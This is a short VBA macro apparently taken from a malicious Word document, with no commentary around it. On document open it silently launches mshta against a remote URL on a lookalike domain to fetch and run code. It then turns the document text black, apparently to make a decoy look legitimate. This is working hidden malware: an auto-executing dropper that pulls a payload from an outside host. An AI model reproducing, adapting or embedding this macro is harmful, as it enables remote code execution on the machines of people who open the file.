Private Sub Document_Open()
    n = Shell("mshta http://naver.midsecurity.org/attache/20201112", vbHide)
    With ActiveDocument.Content
        .Font.ColorIndex = wdBlack
    End With
End Sub
